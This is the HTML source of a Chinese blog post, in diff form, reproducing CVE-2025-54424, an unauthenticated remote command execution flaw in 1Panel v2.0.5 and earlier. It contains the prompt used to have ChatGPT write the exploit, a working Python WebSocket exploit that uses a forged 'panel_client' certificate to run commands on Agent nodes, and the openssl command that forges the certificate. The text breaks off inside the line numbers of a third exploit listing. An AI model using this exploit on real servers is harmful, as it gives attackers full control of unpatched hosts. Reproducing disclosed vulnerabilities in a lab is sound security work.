@@ -1,0 +1,444 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><title>1Panel &lt;= v2.0.5 远程命令执行（CVE-2025-54424）漏洞复现速记 - 水泡泡 - kking</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=Cache-Control content="no-transform"><meta http-equiv=Cache-Control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="水泡泡-kking"><meta name=description content="前言 日常看漏洞资讯，看到这个漏洞。
+1Panel以前接触过，是飞致云的产品。看漏洞描述是未授权的命令执行，那确实是一个严重漏洞。
+漏洞介绍 参考链接 Github Advisorie 写的十分清楚了，漏洞原因与审计过程，甚至POC都给了。
+"><meta name=keywords content="漏洞,网络安全,Web安全,安全研究,大模型,红队,安全攻防"><meta name=generator content="Hugo 0.148.2 with theme even"><link rel=canonical href=https://r00tuser111.github.io/post/1panel_rce_cve_2025_54424/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.a1db14b6e84e8f090408306914864cc22490babc1818d4b1260b716b5ac1a4cc.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:url" content="https://r00tuser111.github.io/post/1panel_rce_cve_2025_54424/"><meta property="og:site_name" content="水泡泡 - kking"><meta property="og:title" content="1Panel <= v2.0.5 远程命令执行（CVE-2025-54424）漏洞复现速记"><meta property="og:description" content="前言 日常看漏洞资讯，看到这个漏洞。
+1Panel以前接触过，是飞致云的产品。看漏洞描述是未授权的命令执行，那确实是一个严重漏洞。
+漏洞介绍 参考链接 Github Advisorie 写的十分清楚了，漏洞原因与审计过程，甚至POC都给了。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2025-08-05T14:15:21+08:00"><meta property="article:modified_time" content="2025-08-05T14:15:21+08:00"><meta property="article:tag" content="漏洞复现"><meta itemprop=name content="1Panel <= v2.0.5 远程命令执行（CVE-2025-54424）漏洞复现速记"><meta itemprop=description content="前言 日常看漏洞资讯，看到这个漏洞。
+1Panel以前接触过，是飞致云的产品。看漏洞描述是未授权的命令执行，那确实是一个严重漏洞。
+漏洞介绍 参考链接 Github Advisorie 写的十分清楚了，漏洞原因与审计过程，甚至POC都给了。"><meta itemprop=datePublished content="2025-08-05T14:15:21+08:00"><meta itemprop=dateModified content="2025-08-05T14:15:21+08:00"><meta itemprop=wordCount content="2582"><meta itemprop=keywords content="漏洞复现"><meta name=twitter:card content="summary"><meta name=twitter:title content="1Panel <= v2.0.5 远程命令执行（CVE-2025-54424）漏洞复现速记"><meta name=twitter:description content="前言 日常看漏洞资讯，看到这个漏洞。
+1Panel以前接触过，是飞致云的产品。看漏洞描述是未授权的命令执行，那确实是一个严重漏洞。
+漏洞介绍 参考链接 Github Advisorie 写的十分清楚了，漏洞原因与审计过程，甚至POC都给了。"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script><script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>水泡泡-kking</a></div><div class=mobile-navbar-icon><span></span>
+<span></span>
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>首页</li></a><a href=/post/><li class=mobile-menu-item>归档</li></a><a href=/tags/><li class=mobile-menu-item>标签</li></a><a href=/categories/><li class=mobile-menu-item>归类</li></a><a href=/about/><li class=mobile-menu-item>关于</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>水泡泡-kking</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>首页</a></li><li class=menu-item><a class=menu-item-link href=/post/>归档</a></li><li class=menu-item><a class=menu-item-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-item-link href=/categories/>归类</a></li><li class=menu-item><a class=menu-item-link href=/about/>关于</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>1Panel &lt;= v2.0.5 远程命令执行（CVE-2025-54424）漏洞复现速记</h1><div class=post-meta><span class=post-time>2025-08-05</span><div class=post-category><a href=/categories/web%E5%AE%89%E5%85%A8/>Web安全</a></div><span class=more-meta>约 2582 字 </span><span class=more-meta>预计阅读 6 分钟</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#漏洞介绍>漏洞介绍</a></li><li><a href=#漏洞复现>漏洞复现</a></li><li><a href=#指纹测绘>指纹测绘</a></li><li><a href=#漏洞修复>漏洞修复</a></li><li><a href=#总结>总结</a></li></ul></nav></div></div><div class=post-content><h1 id=前言>前言</h1><p>日常看漏洞资讯，看到这个漏洞。</p><p><img src=image-20250805141844627.png alt=image-20250805141844627></p><p><code>1Panel</code>以前接触过，是飞致云的产品。看漏洞描述是未授权的命令执行，那确实是一个严重漏洞。</p><h1 id=漏洞介绍>漏洞介绍</h1><p>参考链接 <a href=https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-8j63-96wh-wh3j>Github Advisorie</a> 写的十分清楚了，漏洞原因与审计过程，甚至POC都给了。</p><p><img src=image-20250805142256402.png alt=image-20250805142256402></p><p>这里简单总结一下：</p><p>漏洞根本原因是由于 <code>Core</code> 与 <code>Agent</code> 节点通信的 <code>HTTPS</code> 证书校验不严，只验证了证书<code>CN</code>字段为<code>panel_client</code>，未验证证书签发者，导致攻击者可伪造证书连接<code>Agent</code>节点，从而绕过认证访问高权限接口，最终造成远程命令执行，获取系统权限。</p><h1 id=漏洞复现>漏洞复现</h1><p>使用腾讯云实验室快速搭建环境，官方的一键安装脚本<code>quick_start.sh</code>，需要修改为有漏洞的版本。</p><p><img src=image-20250805143207288.png alt=image-20250805143207288></p><p>随即执行脚本，安装过程中提示安装<code>docker</code>，可不安装省时间。</p><p><img src=image-20250805143351429.png alt=image-20250805143351429></p><p>环境搭建好之后，打开发现节点管理功能需要专业版才有，咬牙买了一个月的专业版。</p><p><img src=image-20250805143515310.png alt=image-20250805143515310></p><p>导入许可证就可以看到节点管理界面了。</p><p>需要另外一台服务器充当节点，添加节点。（直接用本服务器应该也没问题？）</p><p><img src=image-20250805143538688.png alt=image-20250805143538688></p><p>填好节点信息之后就是等安装<code>Agent</code>了，等节点显示<code>正常</code>状态就可以进行测试了。</p><p>根据 <a href=https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-8j63-96wh-wh3j>Github Advisorie</a> 给的信息，整理一下丢给<code>ChatGPT</code>，让它写一个<code>POC</code>出来。</p><p><code>Prompt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>根据下面的漏洞描述，生成</span><span class=n>Python</span> <span class=n>poc代码</span><span class=err>。```</span><span class=n>Description</span>
+</span></span><span class=line><span class=cl><span class=err>项目地址：项目地址</span> <span class=mi>1</span><span class=ne>Panel</span>
+</span></span><span class=line><span class=cl><span class=err>官网：</span><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>www</span><span class=o>.</span><span class=mi>1</span><span class=n>panel</span><span class=o>.</span><span class=n>cn</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=err>时间：</span><span class=mi>2025</span> <span class=mi>07</span> <span class=mi>26</span>
+</span></span><span class=line><span class=cl><span class=err>版本：</span><span class=mi>1</span><span class=n>panel</span> <span class=n>V2</span><span class=o>.</span><span class=mf>0.5</span>
+</span></span><span class=line><span class=cl><span class=err>漏洞简述</span>
+</span></span><span class=line><span class=cl><span class=err>首先引入</span><span class=mi>1</span><span class=n>panel</span> <span class=n>v2</span> <span class=n>Core端与Agent端的概念</span><span class=err>，新版本发布后，</span><span class=mi>1</span><span class=n>panel增加了节点管理的功能</span><span class=err>，可以通过添加节点来控制其他的主机。</span>
+</span></span><span class=line><span class=cl><span class=err>而</span><span class=n>Core端与Agent端通讯所使用的https协议</span><span class=err>，在证书校验中未完全校验证书的真实性导致接口未授权。</span><span class=mi>1</span><span class=n>panel中由于存在大量命令执行或高权限的接口</span><span class=err>，导致</span><span class=n>RCE</span><span class=err>。</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>代码审计过程</span>
+</span></span><span class=line><span class=cl><span class=err>首先我们进入到</span><span class=n>Agent</span> <span class=n>HTTP路由文件agent</span><span class=o>/</span><span class=n>init</span><span class=o>/</span><span class=n>router</span><span class=o>/</span><span class=n>router</span><span class=o>.</span><span class=n>go</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>发现</span><span class=n>Routers函数中引用Certificate函数进行了全局校验agent</span><span class=o>/</span><span class=n>middleware</span><span class=o>/</span><span class=n>certificate</span><span class=o>.</span><span class=n>go</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>发现</span><span class=n>Certificate函数判断了c</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>TLS</span><span class=o>.</span><span class=n>HandshakeComplete是否进行了证书通讯</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>由于</span><span class=n>c</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>TLS</span><span class=o>.</span><span class=n>HandshakeComplete的真假判断是通过agent</span><span class=o>/</span><span class=n>server</span><span class=o>/</span><span class=n>server</span><span class=o>.</span><span class=n>go代码Start函数中的tls</span><span class=o>.</span><span class=n>RequireAnyClientCert来判断的</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>注：此处由于使用</span><span class=n>tls</span><span class=o>.</span><span class=n>RequireAnyClientCert而不是tls</span><span class=o>.</span><span class=n>RequireAndVerifyClientCert</span><span class=err>，</span><span class=n>RequireAnyClientCert只要求客户端提供证书</span><span class=err>，不验证证书的签发</span><span class=n>CA</span><span class=err>，所以任何自签名证书都能通过</span><span class=n>TLS握手</span><span class=err>。</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>后续进入</span><span class=n>Certificate函数中的其他判断</span><span class=err>，只验证了证书</span><span class=n>CN字段为panel_client</span><span class=err>，未验证证书签发者。最后发现</span><span class=n>WebSocket连接可以绕过Proxy</span><span class=o>-</span><span class=n>ID验证</span><span class=err>。</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>项目中存在大量的</span><span class=n>websocket接口</span><span class=err>。</span>
+</span></span><span class=line><span class=cl><span class=n>Process</span> <span class=n>WebSocket</span> <span class=err>接口（根据上述问题可获取所有的进程等敏感信息）</span>
+</span></span><span class=line><span class=cl><span class=err>路由地址</span><span class=p>:</span> <span class=o>/</span><span class=n>process</span><span class=o>/</span><span class=n>ws</span>
+</span></span><span class=line><span class=cl><span class=err>请求格式如下</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;ps&#34;</span><span class=p>,</span>           <span class=o>//</span> <span class=err>数据类型</span><span class=p>:</span> <span class=n>ps</span><span class=p>(</span><span class=err>进程</span><span class=p>),</span> <span class=n>ssh</span><span class=p>(</span><span class=n>SSH会话</span><span class=p>),</span> <span class=n>net</span><span class=p>(</span><span class=err>网络连接</span><span class=p>),</span> <span class=n>wget</span><span class=p>(</span><span class=err>下载进度</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;pid&#34;</span><span class=p>:</span> <span class=mi>123</span><span class=p>,</span>             <span class=o>//</span> <span class=err>可选，指定进程</span><span class=n>ID进行筛选</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;process_name&#34;</span><span class=p>,</span> <span class=o>//</span> <span class=err>可选，根据进程名筛选</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;user&#34;</span>      <span class=o>//</span> <span class=err>可选，根据用户名筛选</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Terminal</span> <span class=n>SSH</span> <span class=n>WebSocket</span> <span class=err>接口（根据上述问题可执行任意命令）</span>
+</span></span><span class=line><span class=cl><span class=err>路由地址</span><span class=p>:</span> <span class=o>/</span><span class=n>hosts</span><span class=o>/</span><span class=n>terminal</span>
+</span></span><span class=line><span class=cl><span class=err>请求格式如下</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;cmd&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;d2hvYW1pCg==&#34;</span>  <span class=o>//</span> <span class=s2>&#34;whoami&#34;</span> <span class=err>的</span><span class=n>base64编码</span><span class=err>，记住不要忘记回车。</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=ne>Container</span> <span class=n>Terminal</span> <span class=n>WebSocket</span> <span class=err>接口（容器执行命令接口）</span>
+</span></span><span class=line><span class=cl><span class=err>路由地址</span><span class=p>:</span> <span class=o>/</span><span class=n>containers</span><span class=o>/</span><span class=n>terminal</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Download</span> <span class=n>Process</span> <span class=n>WebSocket</span> <span class=err>接口（自动推送下载进度信息）</span>
+</span></span><span class=line><span class=cl><span class=err>路由地址</span><span class=p>:</span> <span class=o>/</span><span class=n>files</span><span class=o>/</span><span class=n>wget</span><span class=o>/</span><span class=n>process</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>攻击过程</span>
+</span></span><span class=line><span class=cl><span class=err>首先生成伪造证书</span>
+</span></span><span class=line><span class=cl><span class=n>openssl</span> <span class=n>req</span> <span class=o>-</span><span class=n>x509</span> <span class=o>-</span><span class=n>newkey</span> <span class=n>rsa</span><span class=p>:</span><span class=mi>2048</span> <span class=o>-</span><span class=n>keyout</span> <span class=n>panel_client</span><span class=o>.</span><span class=n>key</span> <span class=o>-</span><span class=n>out</span> <span class=n>panel_client</span><span class=o>.</span><span class=n>crt</span> <span class=o>-</span><span class=n>days</span> <span class=mi>365</span> <span class=o>-</span><span class=n>nodes</span> <span class=o>-</span><span class=n>subj</span> <span class=s2>&#34;/CN=panel_client&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>然后使用证书请求验证，如果成功连接</span><span class=n>websocket接口则存在漏洞</span>
+</span></span><span class=line><span class=cl><span class=err>```</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=image-20250805143801431.png alt=image-20250805143801431></p><p>但由于发现者文字描述漏了<code>/api/v2</code>的前缀，这里生成的<code>POC</code>跑不通，修正之后如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ssl</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>websocket</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># ============================</span>
+</span></span><span class=line><span class=cl><span class=c1># Configurable Parameters</span>
+</span></span><span class=line><span class=cl><span class=c1># ============================</span>
+</span></span><span class=line><span class=cl><span class=n>TARGET</span> <span class=o>=</span> <span class=s2>&#34;https://AGENT_IP_OR_DOMAIN:443&#34;</span>  <span class=c1># 改成目标地址</span>
+</span></span><span class=line><span class=cl><span class=n>CRT_FILE</span> <span class=o>=</span> <span class=s2>&#34;panel_client.crt&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>KEY_FILE</span> <span class=o>=</span> <span class=s2>&#34;panel_client.key&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># WebSocket target endpoints</span>
+</span></span><span class=line><span class=cl><span class=n>PROCESS_WS_URL</span> <span class=o>=</span> <span class=n>TARGET</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;https&#34;</span><span class=p>,</span> <span class=s2>&#34;wss&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;/api/v2/process/ws&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>TERMINAL_WS_URL</span> <span class=o>=</span> <span class=n>TARGET</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;https&#34;</span><span class=p>,</span> <span class=s2>&#34;wss&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;/api/v2/hosts/terminal&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># ============================</span>
+</span></span><span class=line><span class=cl><span class=c1># Helper Functions</span>
+</span></span><span class=line><span class=cl><span class=c1># ============================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect_ws</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>payload</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sslopt</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;certfile&#34;</span><span class=p>:</span> <span class=n>CRT_FILE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;keyfile&#34;</span><span class=p>:</span> <span class=n>KEY_FILE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;cert_reqs&#34;</span><span class=p>:</span> <span class=n>ssl</span><span class=o>.</span><span class=n>CERT_NONE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Connecting to </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ws</span> <span class=o>=</span> <span class=n>websocket</span><span class=o>.</span><span class=n>create_connection</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>sslopt</span><span class=o>=</span><span class=n>sslopt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] WebSocket connected&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Sending payload: </span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ws</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>ws</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Received:&#34;</span><span class=p>,</span> <span class=n>result</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>result</span><span class=p>)[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Error:&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=n>ws</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=s2>&#34;whoami</span><span class=se>\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>terminal_payload</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;cmd&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>connect_ws</span><span class=p>(</span><span class=n>TERMINAL_WS_URL</span><span class=p>,</span> <span class=n>terminal_payload</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>生成证书：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>openssl req -x509 -newkey rsa:2048 -keyout panel_client.key -out panel_client.crt -days <span class=m>365</span> -nodes -subj <span class=s2>&#34;/CN=panel_client&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>测试<code>POC</code>:</p><p><img src=image-20250805144212957.png alt=image-20250805144212957></p><p><img src=image-20250805144233762.png alt=image-20250805144233762></p><p>优化了一下<code>POC</code>，直接减去证书生成的步骤，内置到<code>POC</code>里面：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span><span class=lnt>97
